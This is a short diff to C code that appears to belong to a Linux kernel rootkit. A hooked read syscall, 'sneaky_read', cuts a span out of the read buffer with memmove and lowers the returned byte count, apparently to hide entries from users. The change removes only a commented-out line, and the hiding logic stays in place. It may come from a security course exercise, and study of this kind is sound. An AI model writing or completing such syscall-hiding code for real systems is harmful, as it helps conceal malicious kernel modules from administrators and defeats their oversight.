@@ -124,7 +124,6 @@ asmlinkage ssize_t sneaky_read(struct pt_regs *regs)
     if (end != NULL)
     {
       ssize_t len = (void *)end - (void *)start + 1;
-      // memmove(start, end + 1, nread - ((void *)start - (void *)buf) - len);
       memmove(start, end + 1, nread - ((void *)end - (void *)buf + 1));
       nread -= len;
     }
